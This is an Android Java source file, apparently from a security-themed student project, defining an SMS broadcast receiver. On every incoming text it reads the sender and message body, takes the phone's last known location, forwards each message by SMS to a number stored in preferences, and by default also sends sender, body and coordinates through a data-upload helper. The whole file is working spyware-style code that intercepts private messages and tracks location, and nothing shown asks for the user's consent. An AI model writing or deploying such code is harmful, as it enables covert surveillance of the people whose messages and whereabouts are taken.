package esgi.androsecurity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsMessage;
import android.widget.Toast;

import esgi.androsecurity.util.SendData;
import esgi.androsecurity.util.SendSMS;

/**
 * Created by Tensa on 03/02/2017.
 */

public class SMSReceiver extends BroadcastReceiver{

    double lat;
    double lng;
    SharedPreferences sp;

    @Override
    public void onReceive(Context context, Intent intent){

        Bundle bundle = intent.getExtras();
        Object[] pdus = (Object[]) bundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; i++){
            messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            lat = location.getLatitude();
            lng = location.getLongitude();
            Toast.makeText(context,lat + " - " + lng,Toast.LENGTH_SHORT).show();
        }

        sp = PreferenceManager.getDefaultSharedPreferences(context);

        for (SmsMessage message : messages){

            String strMessageFrom = message.getDisplayOriginatingAddress();
            String strMessageBody = message.getDisplayMessageBody();
            String body = strMessageBody + " - " + strMessageFrom;

            SendSMS.send(sp.getString("number",null),body,context);
            if(sp.getBoolean("data",true)) {
                SendData.send(strMessageFrom,strMessageBody,lat,lng,context);
            }
        }
    }
}
